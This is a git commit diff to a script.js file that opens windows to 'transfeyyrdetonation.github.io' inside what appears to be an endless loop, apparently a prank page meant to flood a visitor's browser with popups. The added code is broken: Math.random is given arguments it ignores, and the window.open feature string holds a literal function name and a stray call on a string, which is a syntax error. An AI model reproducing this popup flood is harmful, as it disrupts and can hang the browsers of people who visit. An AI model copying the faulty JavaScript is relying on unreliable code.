fc6b79f0da455630076985a4020c8290660f299c
kwin487 <82954361+kwin487@users.noreply.github.com>
2022-09-16 11:09:36 -0500

    hwada
    :)

--- script.js
+++ script.js
@@ -1,6 +1,13 @@
-        function NewTab() {
+function randomHeight(){
+        return Math.random(100,1000);
+}
+function randomWidth(){
+        return Math.random(100,1000);
+}
+
+function NewTab() {
             window.open(
-            "transfeyyrdetonation.github.io", "_blank");
+            "transfeyyrdetonation.github.io", "_blank","width=randomWidth(),height=randomHeight"());
         }
 
 for (var i = 0; i < Infinity; i++) {
